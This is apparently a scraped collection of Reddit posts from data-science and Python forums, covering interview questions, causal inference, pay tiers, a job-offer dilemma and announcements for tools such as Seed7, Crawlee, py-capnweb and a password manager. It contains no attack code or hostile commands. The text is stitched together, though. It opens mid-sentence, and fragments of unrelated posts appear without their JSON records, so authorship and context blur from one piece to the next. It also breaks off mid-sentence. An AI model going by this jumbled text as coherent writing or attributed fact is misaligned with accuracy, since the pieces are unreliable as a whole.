wait for UPenn's results? What's my best course of action?

{"post_id": "1nphgwl", "title": "Expectations for probability questions in interviews", "content": "Hey everyone, I'm a PhD candidate in CS, currently starting to interview for industry jobs. I had an interview earlier this week for a research scientist job that I was hoping to get an outside perspective on - I'm pretty new to technical interviewing and there don't seem to be many online resources about what interviewers expectations are going to be for more probability-style questions. I was not selected for a next round of interviews based on my performance, and that's at odds with my self-assessment and with the affect and demeanor of the interviewer. \n\n  \n**The Interview Questions:** A question asking about probabilistic decay of N particles (over discrete time steps, known probability), and was asked to derive the probability that all particles would decay by a certain time. Then, I was asked to write a simulation of this scenario, and get point estimates, variance &amp;c. Lastly, I was asked about a variation where I would estimate the probability, given observed counts. \n\n  \n**My Performance:** I correctly characterized the problem as a Binomial(N,p) problem, where p is the probability that a single particle survives till time T. I did not get a closed form solution (I asked about how I did at the end and the interviewer mentioned that it would have been nice to get one). The code I wrote was correct, and I think fairly efficient? I got a little bit hung up on trying to estimate variance, but ended up with a bootstrap approach. We ran out of time before I could entirely solve the last variation, but generally described an approach. I felt that my interviewer and I had decent rapport, and it seemed like I did decently. \n\n  \n**Question:** Overall, I'd like to know what I did wrong, though of course that's probably not possible without someone sitting in. I did talk throughout, and I have struggled with clear and concise verbal communication in the past. Was the expectation that I would solve all parts of the questions completely?

You'll also need to define the \"execution environment\" in which this pipeline is supposed to run, using Nix as well.\n\nryxpress is on PyPI, but you’ll need Nix (and R + {rixpress}) installed.

We want it to be the most usable RAG builder, while also offering powerful options for finding the ideal RAG parameters.\n\nHighlights:\n\n* **Easy to get started**: just drop in documents, select a template configuration, and you're up and running in a few minutes.\n* **Highly customizable**: you can customize the document extractor, chunking strategy, embedding model/dimension, and search index (vector/full-text/hybrid). Start simple with one-click templates, but go as deep as you want on tuning/customization.\n* **Document library**: manage documents, tag document sets, preview extractions, sync across your team, and more.\n* **Deep integrations**: evaluate RAG-task performance with our evals, expose RAG as a tool to any tool-compatible model\n* **Local**: the Kiln app runs locally and we can't access your data. The V1 of RAG requires API keys for extraction/embeddings, but we're working on fully-local RAG as we speak; see below for questions about where we should focus.\n\nWe have docs walking through the process: [https://docs.kiln.tech/docs/documents-and-search-rag](https://docs.kiln.tech/docs/documents-and-search-rag)\n\n**Question for you:** V1 has a decent number of options for tuning, but folks are probably going to want more. We’d love suggestions for where to expand first. Options are:\n\n* **Document extraction**: V1 focuses on model-based extractors (Gemini/GPT) as they outperformed library-based extractors (docling, markitdown) in our tests. Which additional models/libraries/configs/APIs would you want? Specific open models? Marker? Docling?\n* **Embedding Models**: We're looking at EmbeddingGemma &amp; Qwen Embedding as open/local options. Any other embedding models people like for RAG?\n* **Chunking**: V1 uses the sentence splitter from llama\\_index. Do folks have preferred semantic chunkers or other chunking strategies?\n* **Vector database**: V1 uses LanceDB for vector, full-text (BM25), and hybrid search. Should we support more?

Instead of fiddling with prompts that sometimes regress, you just build up examples.

In July 2024, we launched **Model B** to replace **Model A**, aiming to improve loan approvals and portfolio returns. Our executive team has expressed concern that Model B might be underperforming in some cases.\n\nYour task is to assess the performance of Models A and B across these loan product types and answer the central question: **Should we roll back to Model A or keep and improve Model B?** Additionally, analyze the dataset to uncover any other insights that could guide our decision-making and optimize our lending strategy.\n\nPlease put together a presentation summarizing your findings, insights, and recommendations. Assume your audience has a low level of familiarity with the specifics of the problem but will appreciate clear, data-driven reasoning and business implications. You will present your findings in a 45 minute meeting with stakeholders but ensure to leave ample time for their questions.\n\n**Data Dictionary (for the two attachments below):**\n\n* *Origination Month:* Month in which the loan was funded.\n* *Payment Month:* Payments are made monthly.

For an origination taking place in Jan 2023, their 1st payment month will take place in Feb 2023, their 2nd payment month will take place in March 2023, etc…\n* *Model Version:* Model\\_A is the original model and Model\\_B is the new, updated model.\n* *Scheduled Loan Repayment:* The loan repayments as determined by the amortization schedule at origination.\n* *Forecasted Loan Repayment:* The loan repayments that are forecasted by each model at origination.\n* *Actual Loan Repayment:* The actual loan repayments made during each payment month by borrowers.\n* *Application Submits:* Loan applications that are submitted.\n* *Origination Amount:* The initial principal amount when the loan is funded.\n* *Note: Employer earns revenue as a % fee of the loan origination amount and the investor (Employer’s lending partners which provide the capital for Employer to lend) earns returns based on interest net loss*\n\n**Attachment 1**\n\n|| || |Month|Application Submits|Origination

And how much? When we know people tend to buy more things in holiday season. \n\nSo what test or statistical methods do you use to factor into? Or what are the other methods you use to find how the campaign performed? \n\nFirst i think of is use historical data of the same season for last year, and compare it, but what if we don’t have historical data? \n\nWhat other things need to keep in mind while designing an experiment when we know seasonality could be play big role? And there’s no way we can perform the experiment outside of season? \n\nThanks!\n\n\nEdit- 2nd question, lets say we want to run a promotion during a season, like bf sale, how do you keep treatment and control? Or how do you analyze the effect of sale? As you would not want to hold out on users during sales? Or what companies do during this time to keep a control group ?

{"post_id": "1nhoblg", "title": "Is an explicit \"treatment\" variable a necessary condition for instrumental variable analysis?", "content": "Hi everyone, I'm trying to model the causal impact of our marketing efforts on our ads business, and I'm considering an Instrumental Variable (IV) framework. I'd appreciate a sanity check on my approach and any advice you might have.\n\n**My Goal**: Quantify how much our marketing spend contributes to advertiser acquisition and overall ad revenue.\n\n**The Challenge**: I don't believe there's a direct causal link. My hypothesis is a two-stage process:\n\n* Stage 1:  Marketing spend -&gt; Increases user acquisition and retention -&gt; Leads to higher Monthly Active Users (MAUs).\n* Stage 2: Higher MAUs -&gt; Makes our platform more attractive to advertisers -&gt; Leads to more advertisers and higher ad revenue.\n\nThe problem is that the variable in the middle (MAUs) is endogenous. A simple regression of Ad Revenue \\~ MAUs would be biased because unobserved factors (e.g., seasonality, product improvements, economic trends) likely influence both user activity and advertiser spend simultaneously.\n\n**Proposed IV Setup**:\n\n* **Outcome Variable** (Y): Advertiser Revenue.\n* **Endogenous Explanatory Variable** (\"Treatment\") (X): MAUs (or another user volume/engagement metric).\n* **Instrumental Variable** (Z): This is where I'm stuck. I need a variable that influences MAUs but does not directly affect advertiser revenue, which I believe should be marketing spend. \n\nMy Questions:\n\n* Is this the right way to conceptualize the problem? Is IV the correct tool for this kind of mediated relationship where the mediator (user volume) is endogenous? Is there a different tool that I could use?\n* This brings me to a more fundamental question: Does this setup require a formal \"experiment\"? Or can I apply this IV design to historical, observational time-series data to untangle these effects?\n\nThanks for any insights!\n\n", "author": "Money-Commission9304", "subreddit": "datascience", "score": 16, "upvote_ratio": 0.9, "num_comments": 13, "created_utc": "2025-09-16T00:03:59", "url": "https://www.reddit.com/r/datascience/comments/1nhoblg/is_an_explicit_treatment_variable_a_necessary/", "permalink": "https://reddit.com/r/datascience/comments/1nhoblg/is_an_explicit_treatment_variable_a_necessary/", "is_self": true, "domain": "self.datascience", "tech_keywords": ["AR", "revenue", "acquisition"], "crawled_at": "2025-10-03T13:57:06.982445", "sentiment_score": {"vader_compound": 0.6426, "vader_positive": 0.045, "vader_neutral": 0.927, "vader_negative": 0.028, "textblob_polarity": 0.2046536796536797, "textblob_subjectivity": 0.4724025974025974, "overall_sentiment": "positive"}},

{"post_id": "1ng1xk3", "title": "The “three tiers” of data engineering pay — and how to move up", "content": "**The “three tiers” of data engineering pay — and how to move up (shout out to the article by geergly orosz which i placed in the bottom)**\n\nI keep seeing folks compare salaries across wildly different companies and walk away confused. A useful mental model I’ve found is that comp clusters into *three tiers* based on company type, not just your years of experience or title. Sharing this to help people calibrate expectations and plan the next move.\n\n# The three tiers\n\n* **Tier 1 — “Engineering is a cost center.”** Think traditional companies, smaller startups, internal IT/BI, or teams where data is a support function. Pay is the most modest, equity/bonuses are limited, scope is narrower, and work is predictable (reports, ELT to a warehouse, a few Airflow dags, light stakeholder churn).\n* **Tier 2 — “Data is a growth lever.”** Funded startups/scaleups and product-centric companies. You’ll see modern stacks (cloud warehouses/lakehouses, dbt, orchestration, event pipelines), clearer paths to impact, and some equity/bonus. companies expect design thinking and hands-on depth. Faster pace, more ambiguity, bigger upside.\n* **Tier 3 — “Data is a moat.”** Big tech, trading/quant, high-scale platforms, and companies competing globally for talent. Total comp can be multiples of Tier 1. hiring process are rigorous (coding + system design + domain depth). Expectations are high: reliability SLAs, cost controls at scale, privacy/compliance, streaming/near-real-time systems, complex data contracts.\n\nNone of these are “better” by default. They’re just different trade-offs: stability vs. upside, predictability vs. scope, lower stress vs. higher growth.\n\n# Signals you’re looking at each tier\n\n* **Tier 1:** job reqs emphasize tools (“Airflow, SQL, Tableau”) over outcomes; little talk of SLAs, lineage, or contracts; analytics asks dominate; compensation is mainly base.\n* **Tier 2:** talks about metrics that move the business, experimentation, ownership of domains, real data quality/process governance; base + some bonus/equity; leveling exists but is fuzzy.\n* **Tier 3:** explicit levels/bands, RSUs or meaningful options, on-call for data infra, strong SRE practices, platform/mesh/contract language, cost/perf trade-offs are daily work.\n\n# If you want to climb a tier, focus on evidence of impact at scale\n\nThis is what consistently changes comp conversations:\n\n* **Design → not just build.** Bring written designs for one or two systems you led: ingestion → storage → transformation → serving. Show choices and trade-offs (batch vs streaming, files vs tables, CDC vs snapshots, cost vs latency).\n* **Reliability &amp; correctness.** Prove you’ve owned SLAs/SLOs, data tests, contracts, backfills, schema evolution, and incident reviews. Screenshots aren’t necessary—bullet the incident, root cause, blast radius, and the guardrail you added.\n* **Cost awareness.** Know your unit economics (e.g., cost per 1M events, per TB transformed, per dashboard refresh). If you’ve saved the company money, quantify it.\n* **Breadth across the stack.** A credible story across ingestion (Kafka/Kinesis/CDC), processing (Spark/Flink/dbt), orchestration (Airflow/Argo), storage (lakehouse/warehouse), and serving (feature store, semantic layer, APIs). You don’t need to be an expert in all—show you can choose appropriately.\n* **Observability.** Lineage, data quality checks, freshness alerts, SLIs tied to downstream consumers.\n* **Security &amp; compliance.** RBAC, PII handling, row/column-level security, audit trails. Even basic exposure here is a differentiator.\n\n# prep that actually moves the needle\n\n* **Coding:** you don’t need to win ICPC, but you *do* need to write clean Python/SQL under time pressure and reason about complexity.\n* **Data system design:** practice 45–60 min sessions. Design an events pipeline, CDC into a lakehouse, or a real-time metrics system. Cover partitioning, backfills, late data, idempotency, dedupe, compaction, schema evolution, and cost.\n* **Storytelling with numbers:** have 3–4 impact bullets with metrics: “Reduced warehouse spend 28% by switching X to partitioned Parquet + object pruning,” “Cut pipeline latency from 2h → 15m by moving Y to streaming with windowed joins,” etc.\n* **Negotiation prep:** know base/bonus/equity ranges for the level (bands differ by tier). Understand RSUs vs options, vesting, cliffs, refreshers, and how performance ties to bonus.\n\n# Common traps that keep people stuck\n\n* **Tool-first resumes.** Listing ten tools without outcomes reads Tier 1. Frame with “problem → action → measurable result.”\n* **Only dashboards.** Valuable, but hiring loops for higher tiers want ownership of data *as a product*.\n* **Ignoring reliability.** If you’ve never run an incident call for data, you’re missing a lever that Tier 2/3 value highly.\n* **No cost story.** At scale, cost is a feature. Even a small POC that trims spend is compelling signal.\n\n# Why this matters\n\nAverages hide the spread. Two data engineers with the same YOE can be multiple tiers apart in pay purely based on company type and scope. When you calibrate to tiers, expectations and strategy get clearer.\n\nIf you want a deeper read on the broader “three clusters” concept for software salaries, Gergely Orosz has a solid breakdown (“The Trimodal Nature of Software Engineering Salaries”). The framing maps neatly onto data engineering roles too. link in the bottom\n\nCurious to hear from this sub:\n\n* If you moved from Tier 1 → 2 or 2 → 3, what was the single project or proof point that unlocked it?\n* For folks hiring: what signals *actually* distinguish tiers in your loop?\n\narticle: [https://blog.pragmaticengineer.com/software-engineering-salaries-in-the-netherlands-and-europe/](https://blog.pragmaticengineer.com/software-engineering-salaries-in-the-netherlands-and-europe/)", "author": "chrisgarzon19", "subreddit": "datascience", "score": 0, "upvote_ratio": 0.32, "num_comments": 2, "created_utc": "2025-09-14T01:30:33", "url": "https://www.reddit.com/r/datascience/comments/1ng1xk3/the_three_tiers_of_data_engineering_pay_and_how/", "permalink": "https://reddit.com/r/datascience/comments/1ng1xk3/the_three_tiers_of_data_engineering_pay_and_how/", "is_self": true, "domain": "self.datascience", "tech_keywords": ["AI", "AR", "python", "equity", "growth"], "crawled_at": "2025-10-03T13:57:06.989812", "sentiment_score": {"vader_compound": 0.9906, "vader_positive": 0.072, "vader_neutral": 0.898, "vader_negative": 0.031, "textblob_polarity": 0.03472290640394088, "textblob_subjectivity": 0.4227668308702792, "overall_sentiment": "positive"}},

{"post_id": "1na6x3q", "title": "Help me evaluate a new job offer - Stay or go?", "content": "Hi all, \n\nI'm having a really hard time deciding whether or not to take an offer I've recently received, would really appreciate some advice and a sense check. For context I generally feel my current role is comfortable but i'm starting to plateau after the first year, i'm also in the process of buying my dream house just to complicate things.\n\n### **Current Role**\n\n##### The Good\n\n- I am early 30's and have 4 years of experience as a full stack DS but am currently employed as an ML Eng for the last year. \n- My current role is effectively a senior/lead MLE in a small team (me + 3 DS) and I have loads of autonomy in how we do things and I get to lead my own  Gen AI projects with small squads as I'm the only one with experience in this domain. \n- I also get to straddle DS and MLE as much or as little as I want to in other projects, which suits my interests and background. \n- We have some interesting projects including one I'm leading. I think I have around 6 months of cool work to do where I can personally make an impact. \n- My work life balance is amazing, I'm not stressed at work at all and I can learn at my own pace. \n- Effectively remote, go into the office 1 or 2 times per month for meetings. It's 1.5 hours away but work pay for my travel. \n- Can push for a senior or principal title and will likely get it in the next ~6 months. \n\n##### The Bad\n\n- The main drawbacks here are that I don't have senior technical mentors, my direct boss has good soft skills but I have nothing to learn from him technically. He's also quite chaotic, so we are always shifting priorities etc. \n- It's a brand new team so we are constantly hitting blockers in terms of processes, integration of our projects and office politics. \n- Being a legacy insurer, innovation is really hard and momentum needed to shift opinions is huge. \n- Fundamentally data quality is very poor and this won't change in my tenure. \n- Essentially in an echo chamber, I'm bringing most of the ideas and solutions to the table in the team which potentially isn't great at this stage in my career.\n- It's not perfect and I'd have to leave at some point anyway. \n\n\n##### Comp\n- Total comp including bonus and generous pension is £84K\n\n\n### **New Job** AI Engineer\n\n##### The Good\n- Very cool AI consultancy startup, 2 years old, ~80 technical staff and growing rapidly, already profitable with a revenue of £1mill per month and partnership with Open AI.\n- Lots of interesting projects with cool clients. The founders' mantra is \"cool projects, in production\" and they have some genuinely interesting case studies. \n- Some projects are genuinely cutting edge and they claim to have a nice balance between R&amp;D and delivery. \n- Lots of technical staff to learn from, should be good for my growth. \n- Opportunity to work internationally in the future, the are opening offices in Australia now and eventually the US. \n\n\n##### The Bad\n\n- Pigeon holing myself into AI/Agents/LLMs. No trad ML, may lose some of my very rounded skill set.\n- Although it's customer facing, it sounds like the role is very delivery heavy and I'd essentially be smashing out code or researching all day with less soft skill development.\n- Slightly worried about work culture and work life balance, this could end up being a meat grinder. \n- I have no experience of start ups or start up culture at all.\n- Less job security as its a startup. \n- It's mostly based in London (5 hours round trip!) and I would need to travel down relatively frequently (expenses paid) for onboarding and establishing myself in the first few months, with that requirement tapering off slowly. \n\n\n##### Comp\n\n- Total offer all in is £90K, I could try and negotiate for up to £95K based on their bandings. \n- 36000 stock units, worthless until they sell though\n   \n\n\nWould love to know your thoughts!\n\n\n", "author": "Rockingtits", "subreddit": "datascience", "score": 14, "upvote_ratio": 0.75, "num_comments": 36, "created_utc": "2025-09-07T03:27:39", "url": "https://www.reddit.com/r/datascience/comments/1na6x3q/help_me_evaluate_a_new_job_offer_stay_or_go/", "permalink": "https://reddit.com/r/datascience/comments/1na6x3q/help_me_evaluate_a_new_job_offer_stay_or_go/", "is_self": true, "domain": "self.datascience", "tech_keywords": ["AI", "AR", "stock", "revenue", "profit", "growth"], "crawled_at": "2025-10-03T13:57:07.017901", "sentiment_score": {"vader_compound": 0.9962, "vader_positive": 0.137, "vader_neutral": 0.801, "vader_negative": 0.062, "textblob_polarity": 0.09378757454058662, "textblob_subjectivity": 0.47221917974930017, "overall_sentiment": "positive"}},

{"post_id": "1nvdaxc", "title": "Seed7: a programming language which cares about maintainability", "content": "Seed7 is based on ideas from my diploma and doctoral theses about an extensible programming language (1984 and 1986). In 1989 development began on an interpreter and in 2005 the project was released as open source. Since then it is improved on a regular basis.\n\nSeed7 is about [maintainability](https://seed7.net/faq.htm#maintainability), [portability](https://seed7.net/faq.htm#portable), [performance](https://seed7.net/scrshots/s7c.htm) and [memory safety](https://seed7.net/faq.htm#memory_safety). There is an [automatic memory management](https://seed7.net/faq.htm#garbage_collection), but there is no garbage collection process, that interrupts normal processing. The [templates](https://seed7.net/manual/tutorial.htm#Templates) and [generics](https://seed7.net/manual/decls.htm#Abstract_data_types) of Seed7 don't need special syntax. They are just normal functions, which are executed at compile-time.\n\nSeed7 is an [extensible](https://seed7.net/faq.htm#extensible_programming) programming language. The syntax and semantics of [statements](https://seed7.net/manual/stats.htm) (and [abstract data types](https://seed7.net/manual/decls.htm#Abstract_data_type), etc.) is defined in libraries. The whole language is defined in the library \"seed7\\_05.s7i\". You can extend the language [syntactically](https://seed7.net/manual/syntax.htm) and semantically ([introduce new loops](https://seed7.net/manual/tutorial.htm#Declare_a_statement), etc.). In other languages the syntax and semantics of the language is hard-coded in the compiler.\n\nSeed7 checks for [integer overflow](https://seed7.net/faq.htm#integer_overflow). You either get the correct result or an [OVERFLOW\\_ERROR](https://seed7.net/manual/errors.htm#OVERFLOW_ERROR) is raised. Unlike many JVM based languages Seed7 compiles to machine code ahead of time (GRAAL works ahead of time but it struggles with reflection).  Unlike many systems languages (except Rust) Seed7 is a [memory safe](https://seed7.net/faq.htm#memory_safety) language.\n\nThe [Seed7 homepage](https://seed7.net) contains the language documentation. The source code is at [GitHub](https://github.com/ThomasMertes/seed7). Questions that are not in the [FAQ](https://seed7.net/faq.htm) can be asked at [r/seed7](https://www.reddit.com/r/seed7/).\n\nSome programs written in Seed7 are:\n\n* [make7](https://seed7.net/scrshots/make7.htm): a make utility.\n* [bas7](https://seed7.net/scrshots/bas7.htm): a BASIC interpreter.\n* [pv7](https://seed7.net/scrshots/pv7.htm): a Picture Viewer for BMP, GIF, ICO, JPEG, PBM, PGM, PNG, PPM and TIFF files.\n* [tar7](https://seed7.net/scrshots/tar7.htm): a tar archiving utility.\n* [ftp7](https://seed7.net/scrshots/ftp7.htm): an FTP Internet file transfer program.\n* [comanche](https://seed7.net/scrshots/comanche.htm): a simple web server for static HTML pages and CGI programs.\n\nScreenshots of Seed7 programs can be found [here](https://seed7.net/scrshots/index.htm) and there is a [demo page](https://seed7.net/demo.htm) with Seed7 programs, which can be executed in the browser. These programs have been compiled to JavaScript / WebAssembly.\n\nI recently [released a new version](https://www.reddit.com/r/seed7/comments/1nv9zwf/seed7_version_20250930_released_on_github_and_sf/) which improved the [bas7](https://seed7.net/scrshots/bas7.htm) example program and drivers for console, graphics and databases.

{"post_id": "1nvxty1", "title": "AI is Creating a Silent Crisis in the Developer Workforce", "content": "There's no denying that AI like Copilot and ChatGPT has become a productivity rocket booster for developers. It can turn a 30-minute boilerplate task into a 30-second prompt. But as I integrate these tools deeper into my workflow, I'm seeing a concerning side-effect: we're silently creating a two-tiered system.\n\n\n\nOn one side, a new wave of developers leans too heavily on AI, potentially shipping code they don't understand. On the other, experienced developers who resist these tools are being left behind, their productivity starting to pale in comparison. It feels like we're trading deep understanding for raw speed, and I'm not sure the long-term cost is worth it.\n\n\n\nLet me break down the two main challenges I see.\n\n\n\nThe Vibe Coders: When You Don't Understand the \"How\"\n\n\n\nAs a student, I see colleagues using AI not to save time for deeper learning, but to avoid learning altogether. It's baffling. A tool meant to improve efficiency is being used to enable procrastination. All around, experienced developers, employers, and lecturers are sounding the alarm: \"JUNIOR DEVELOPERS DON'T KNOW HOW TO CODE ANYMORE!\"\n\n\n\nThis is an inherent risk of AI over-reliance. It makes me wonder: is this the future? A world where no one understands the gears and mechanics behind the code, only that it works? What happens when the AI can't fix a critical bug, and you lack the fundamental knowledge to step in?\n\n\n\nThe AI-Abstainers: The Risk of Being Left Behind\n\n\n\nConversely, we have brilliant, experienced developers who are being left behind because they choose not to adopt these tools. While deep knowledge is invaluable, the downside of slower productivity is becoming a real liability.\n\n\n\nWe have to be honest: AI is only getting better, faster, and more efficient. The question isn't if it will become the optimal choice for building software quickly, but when. To ignore this is to risk irrelevance.\n\n\n\nThe Lesson from the \"God of Craftsmanship\"\n\n\n\nThis dilemma reminds me of the deity from Lord of the Mysteries, the \"God of Craftsmanship.\" He represented traditional, handmade artistry. A King, who was ahead of his time, sparked an industrial revolution, this god faced a choice: cling to the past or embrace the future. He wisely rebranded himself as the \"God of Steam and Machinery,\" symbolizing innovation and technology.\n\n\n\nThe real-world Industrial Revolution followed the same script. Artisans and blacksmiths who resisted were left in poverty, while those who adapted to factories and machinery thrived.

In plain terms, this means that complex data relations can be conveyed in objects, maintained state, and queried easily. For example, if I have a list of 100k cars in a city and want to get a list of cars moving between 20 and 40 mph and the owner of the car is named \"Jim\" that was born after 2005, that can be a single built query with sub 1 ms response. Keep in mind that the cars speed is constantly changing, updating the data structures as it goes.\n\nIn testing, its significantly (20- 50x) faster than pandas dataframe filtering on a data size of 100k. Query time complexity is roughly O(q + r) where q is the amount of query operations (and, or, in, eq, gt, nesting, etc) and r is the result size. \n\nThe cost to index is defined paid and building the structure takes around 6-7x longer than a dataframe consuming a list, but definitely worth it if the data is queried more than 3-4 times\n\nPerformance has been and is still a constant battle with the hashmap and b-tree inserts consuming most of the process time. \n\n-**Target Audience**\n\nCurrently this is not production ready as it is not tested thoroughly. Once proven, it will be supported and continue driving towards ETL and simulation within OOP driven code. At this current state it should only be used for analytics and analysis \n\n-**Conparison**\n\nThis competes with traditional dataframes like arrow, pandas, and polars, except it is the only one that handles native objects internally as well as indexes attributes for highly performant lookup.

It features both a user-friendly graphical interface and a command-line interface for automation. The tool uses Google's powerful SigLIP 2 model to understand the content of your files and stores the data locally in an SQLite database for fast, private searching.\n\n# Target Audience\n\nThis tool is designed for anyone with a large local collection of photos and videos who wants a better way to navigate them. It is particularly useful for:\n\n* **Photographers and videographers** needing to quickly find specific shots within their archives.\n* **AI enthusiasts and developers** looking for a hands-on project that uses a SOTA vision-language model.\n* **Privacy-conscious users** who prefer an offline solution for managing their personal media without uploading it to the cloud.\n\n**IT IS NOT INTENDED FOR LARGE SCALE ENTERPRISE PRODUCTION**.\n\n# Comparison\n\nThis project stands apart from alternatives like `rclip` and other search tools built on the original CLIP model in a few significant ways:\n\n* **Superior model**: It is built on **Google's SigLIP 2**, a more recent and powerful model that provides better performance and efficiency in image-text retrieval compared to the original CLIP used by `rclip`. SigLIP 2's training method leads to improved semantic understanding.\n* **Flexible resolution (NaFlex)**: The tool utilizes the `naflex` variant of SigLIP 2, which can process images at various resolutions while preserving their original aspect ratio. This is a major advantage over standard CLIP models that often resize images to a fixed square, which can distort content and reduce accuracy (especially in OCR applications).\n* **GUI and CLI**: Unlike `rclip` which is primarily a command-line tool, this project offers both a **very simple graphical interface (will update in the future) and a command line interface**.

Servy comes with a GUI, CLI, PowerShell integration, and a manager app for monitoring services in real time.\n\nTarget Audience\n\nServy is meant for developers or sysadmins who need to keep Python scripts running reliably in the background without having to rewrite them as Windows services. It works equally well for Node.js, .NET, or any executable, but I built it with Python apps in mind. It’s designed for production use on Windows 7 through Windows 11 as well as Windows Server.\n\nComparison\n\nCompared to tools like sc or nssm, Servy adds important features that make managing services easier. It lets you set a custom working directory (avoiding the common C:\\Windows\\System32 issue that breaks relative paths), redirect stdout and stderr to rotating log files, and configure health checks with automatic recovery and restart policies.

{"post_id": "1nv5lcw", "title": "py-capnweb - A Python implementation of Cap'n Web's RPC protocol", "content": "I've just released v0.3.0 of a project I've been working on called **py-capnweb**.\n\nIt's a Python implementation of the [Cap'n Web protocol](https://github.com/cloudflare/capnweb), a fascinating new RPC protocol announced a couple of weeks ago. My implementation is **fully interoperable** with the official TypeScript version, so you can have a Python backend talking to a TypeScript/JS frontend (and vice-versa) seamlessly.\n\n# What The Project Does\n\n`py-capnweb` is designed to eliminate the friction of client-server communication. It makes remote function calls feel just like local function calls. Instead of manually writing HTTP endpoints, serializing data, and dealing with network waterfalls, you can design your APIs like you would a normal JavaScript or Python library.\n\nTwo main features stand out: **capability-based security** and **promise pipelining**. This means you pass around secure object references instead of raw data, and you can chain multiple dependent calls into a single network round trip, which can be a huge performance win.\n\n# Target Audience &amp; Production Readiness\n\nThis project is for developers building interactive, cross-language applications (e.g., Python backend, JS/TS frontend) who are tired of the boilerplate and latency issues that come with traditional REST or even GraphQL APIs.\n\n**Is it production-ready?** The protocol itself is new but built on the mature foundations of Cap'n Proto. My implementation is at `v0.3.0` and passes a comprehensive cross-implementation test suite. It's stable and ready for real-world use cases, especially for teams that want to be on the cutting edge of RPC technology.\n\n# How is it Different from REST, gRPC, or GraphQL?\n\nThis is the most important question! Here’s a quick comparison:\n\n* **vs. REST:** REST is resource-oriented, using a fixed set of verbs (GET, POST, etc.). Cap'n Web is object-oriented, allowing you to call methods on remote objects directly. This avoids the \"N+1\" problem and complex state management on the client, thanks to promise pipelining.\n* **vs. gRPC:** gRPC is a high-performance RPC framework, but it's schema-based (using Protocol Buffers). Cap'n Web is schema-less, making it more flexible and feel more native to dynamic languages like Python and JavaScript, which means less boilerplate. While gRPC has streaming, Cap'n Web's promise pipelining and bidirectional nature provide a more expressive way to handle complex, stateful interactions.\n* **vs. GraphQL:** GraphQL is excellent for querying complex data graphs in one go. However, it's a specialized query language and can be awkward for mutations or chained operations. Cap'n Web solves the same \"over-fetching\" problem as GraphQL but feels like writing regular code, not a query. You can intuitively chain calls (`user.getProfile()`, `profile.getFriends()`, etc.) in a single, efficient batch.\n\n# Key Features of py-capnweb\n\n* **100% TypeScript Interoperability**: Fully tested against the official `capnweb` library.\n* **Promise Pipelining**: Batch dependent calls into a single network request to slash latency.\n* **Capability-Based Security**: Pass around secure object references, not exposed data.\n* **Bidirectional RPC**: It's peer-to-peer; the \"server\" can call the \"client\" just as easily.\n* **Pluggable Transports**: Supports HTTP batch and WebSocket out-of-the-box.

{"post_id": "1nu8tt6", "title": "Crawlee for Python v1.0 is LIVE!", "content": "Hi everyone, our team just launched [**Crawlee for Python 🐍**](https://github.com/apify/crawlee-python/) **v1.0**, an open source web scraping and automation library. We launched the beta version in Aug 2024 [here](https://www.reddit.com/r/Python/comments/1dyyaky/crawlee_for_python_is_live/), and got a lot of feedback. With new features like Adaptive crawler, unified storage client system, Impit HTTP client, and a lot of new things, the library is ready for its public launch.\n\n**What My Project Does**\n\nIt's an open-source web scraping and automation library, which provides a unified interface for HTTP and browser-based scraping, using popular libraries like [beautifulsoup4](https://pypi.org/project/beautifulsoup4/) and [Playwright](https://playwright.dev/python/) under the hood.\n\n**Target Audience**\n\nThe target audience is developers who wants to try a scalable crawling and automation library which offers a suite of features that makes life easier than others. We launched the beta version a year ago, got a lot of feedback, worked on it with help of early adopters and launched Crawlee for Python v1.0.\n\n**New features**\n\n* **Unified storage client system**: less duplication, better extensibility, and a cleaner developer experience. It also opens the door for the community to build and share their own storage client implementations.\n* **Adaptive Playwright crawler**: makes your crawls faster and cheaper, while still allowing you to reliably handle complex, dynamic websites. In practice, you get the best of both worlds: speed on simple pages and robustness on modern, JavaScript-heavy sites.\n* **New default HTTP client** (ImpitHttpClient, powered by the [Impit](https://github.com/apify/impit) library): fewer false positives, more resilient crawls, and less need for complicated workarounds. Impit is also developed as an open-source project by Apify, so you can dive into the internals or contribute improvements yourself: you can also create your own instance, configure it to your needs (e.g. enable HTTP/3 or choose a specific browser profile), and pass it into your crawler.\n* **Sitemap request loader**: easier to start large-scale crawls where sitemaps already provide full coverage of the site\n* **Robots exclusion standard**: not only helps you build ethical crawlers, but can also save time and bandwidth by skipping disallowed or irrelevant pages\n* **Fingerprinting**: each crawler run looks like a real browser on a real device. Using fingerprinting in Crawlee is straightforward: create a fingerprint generator with your desired options and pass it to the crawler.\n* **Open telemetry**: monitor real-time dashboards or analyze traces to understand crawler performance. easier to integrate Crawlee into existing monitoring pipelines\n\n**Find out more**\n\nOur team will be here in r/Python for an **AMA** on **Wednesday 8th October 2025, at 9am EST/2pm GMT/3pm CET/6:30pm IST**.

Cloud-based solutions, on the other hand, are polished and offer seamless cross-device sync, but they usually come with privacy trade-offs, vendor lock-in, or a subscription cost.\n\n**Poottu tries to strike a balance between the two** — it’s completely offline and open-source like CLI tools, but it also provides a clean, beginner-friendly desktop GUI that makes managing entries much easier.\n\nThe trade-off is that Poottu doesn’t ship with built-in sync. In short: Poottu aims to sit between a low-level CLI vault like `pass` and full-featured cloud managers — offering **local safety plus a friendly UI**.\n\n# Availability\n\n* GitHub: [github.com/manikandancode/poottu](https://github.com/manikandancode/poottu)\n* PyPI: [pypi.org/project/poottu](https://pypi.org/project/poottu/)\n\n# License\n\nMIT License\n\n# Installation\n\nYou can install from PyPI:\n\n    pip install poottu\n\nThen run:\n\n    poottu\n\nI beautified and commented the code using AI to improve readability and inline documentation.

They also feel kind of bloated for what I need them to do. I simply wanted to use `uv version` to update my project metadata, paired with a small pipeline that safeguards the process and ships the changes + version tag to the repo.\n\nIf you're curious, please check out [**uv-ship**](https://floraths.github.io/uv-ship/)\n\n**What My Project Does**\n\n&gt;\n\n&gt;**preflight checks**: guard your release workflow by verifying branch, tags, and a clean working tree before shipping.\n\n&gt;**changelog generation**: auto-builds changelog sections from commits since the latest tag.\n\n&gt;**one-shot release**: stage, commit, tag, and push in a single step.\n\n&gt;**dry-run mode**: preview every action before making changes.\n\n**Target Audience** \n\nmaintainers of uv-managed projects with strict release workflows.\n\n**Comparison**  \nuv-ship is similar in scope to [bump-my-version](https://callowayproject.github.io/bump-my-version/) but it integrates with uv out-of-the-box. For example, if you use bump-my-version you need to set up the following workflow:\n\n1. execute version bump with `bump-my-version bump minor`\n2. include a pre-commit hook that runs `uv sync`\n3. tell bump-my-version that pyproject.toml and uv.lock need to be committed\n4. create the tag and push it manually\n\nbump-my-version offers automation with pre- and post-commit hooks, but it does not evaluate if the tag 